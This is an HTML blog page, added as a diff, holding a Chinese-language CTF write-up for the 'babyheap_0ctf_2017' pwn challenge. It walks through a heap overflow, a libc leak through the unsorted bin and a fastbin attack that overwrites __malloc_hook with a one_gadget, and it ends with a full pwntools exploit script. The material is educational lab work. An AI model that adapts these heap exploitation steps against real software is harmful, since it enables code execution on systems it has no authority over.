@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"heygap.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="练习题 wp 记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn - Practice">
+<meta property="og:url" content="http://heygap.github.io/2023/08/14/Pwn%20-%20Practice/index.html">
+<meta property="og:site_name" content="Gap&#39;s_Blog">
+<meta property="og:description" content="练习题 wp 记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814133847.png">
+<meta property="og:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814134313.png">
+<meta property="og:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814141436.png">
+<meta property="og:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814144704.png">
+<meta property="og:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814145721.png">
+<meta property="article:published_time" content="2023-08-14T05:22:00.000Z">
+<meta property="article:modified_time" content="2024-01-30T08:08:14.735Z">
+<meta property="article:author" content="Gap">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://heygap.github.io/pic/Pasted%20image%2020230814133847.png">
+
+<link rel="canonical" href="http://heygap.github.io/2023/08/14/Pwn%20-%20Practice/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Pwn - Practice | Gap's_Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Gap's_Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">靡不有初 鲜克有终</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/HeyGap" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://heygap.github.io/2023/08/14/Pwn%20-%20Practice/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Gap">
+      <meta itemprop="description" content="An undergraduate student of Cybersecurity at SDU.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Gap's_Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Pwn - Practice
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-14 13:08:00" itemprop="dateCreated datePublished" datetime="2023-08-14T13:22:00+08:00">2023-08-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-01-30 16:01:73" itemprop="dateModified" datetime="2024-01-30T16:08:14+08:00">2024-01-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-practice/" itemprop="url" rel="index"><span itemprop="name">CTF_practice</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote class="blockquote-center">
+练习题 wp 记录
+</blockquote>
+<span id="more"></span>
+<blockquote class="blockquote-center">
+第一道Heap，插个里程碑纪念一下XD
+</blockquote>
+<h2 id="x01-buuctf-babyheap_0ctf_2017">0x01 BUUCTF
+babyheap_0ctf_2017</h2>
+<h3 id="x00-写在前面">0x00 写在前面</h3>
+<p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
+八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
+参加了个数据安全的夏令营<br />
+给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br />
+给SecretFlow审了一点go语言的洞<br />
+然后用C#和xaml给sdu校园网写了个一键修复脚本<br />
+总而言之学的很杂...说实话真不如多打点比赛。<br />
+本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
+总而言之还是脚踏实地学一点算一点吧<br />
+还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
+<hr />
+<blockquote>
+<p>做完这道题才算真正意义上的AK第一页XD ### Ⅰ. 主要知识点 1. 堆溢出</p>
+</blockquote>
+<h3 id="解题步骤">Ⅱ. 解题步骤</h3>
+<ol type="1">
+<li><p>checksec 保护全开<br />
+<img src="/pic/Pasted%20image%2020230814133847.png" /></p></li>
+<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
+<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
+<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
+src="/pic/Pasted%20image%2020230814134623.png" />
+注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p></li>
+<li><p>IDA分析可知，我们可以有以下思路：</p>
+<ol type="1">
+<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
+<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址
+<ol type="1">
+<li>要泄露libc地址，肯定要读存有libc地址的地址
+<ol type="1">
+<li>哪里存着libc地址？unsorted
+bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
+<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
+</ol></li>
+</ol></li>
+<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
+</ol></li>
+<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted
+bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin
+chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index = 4</span></span><br></pre></td></tr></table></figure> 此时堆的情况如下 <img
+src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
+<li><p>Free掉index为1和2的chunk，给后面alloc留出空间 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+heap情况如下 <img src="/pic/Pasted%20image%2020230814141436.png" />
+bin情况如下 <img
+src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
+<li><p>堆溢出，操控fastbin</p>
+<ol type="1">
+<li>现在是main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
+<li>我们想办法让它变成 xxx_0x20 ---&gt; chunk2 ---&gt;chunk4
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
+（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
+</ol></li>
+<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure> heap情况如下 <img
+src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
+<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78
+<img src="/pic/Pasted%20image%2020230814144704.png" />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure></p></li>
+<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方
+<img src="/pic/Pasted%20image%2020230814145721.png" />
+发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br />
+⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 将unsortedbin中的chunk4切0x60大小申请出来</span></span><br><span class="line">free(<span class="number">4</span>)                                        <span class="comment"># 把chunk4放到fastbin中，便于用pointer_chunk2操控</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)              <span class="comment"># 把申请块写进malloc_hook前面</span></span><br><span class="line">fill(<span class="number">2</span>,payload)                                <span class="comment"># 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 把chunk4申请回来</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 在malloc_hook处构造堆，index=6</span></span><br></pre></td></tr></table></figure>
+<ol start="13" type="1">
+<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
+<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat
+flag <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">255</span>)</span><br></pre></td></tr></table></figure></p></li>
+</ol>
+<h3 id="完整exp">Ⅲ. 完整EXP</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25970</span></span><br><span class="line">file = <span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="一些疑问">Ⅳ. 一些疑问</h3>
+<ol type="1">
+<li>__malloc_hook不是在data段中吗？这题开了FULL
+RELRO为什么可以改啊🤔</li>
+<li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
+<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？
+<ol type="1">
+<li>unsortedbin，后向合并</li>
+</ol></li>
+<li><strong><em>为什么非要在aed处申请堆块？</em></strong>
+<ol type="1">
+<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
+</ol></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Gap
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://heygap.github.io/2023/08/14/Pwn%20-%20Practice/" title="Pwn - Practice">http://heygap.github.io/2023/08/14/Pwn - Practice/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------文章就到这里啦！<i class="fa fa-paw"></i>感谢您的阅读XD-------------</div>
+    
+</div>
+        
+      </div>
+
+      <footer class="post-footer">
+          <div class="post-tags">
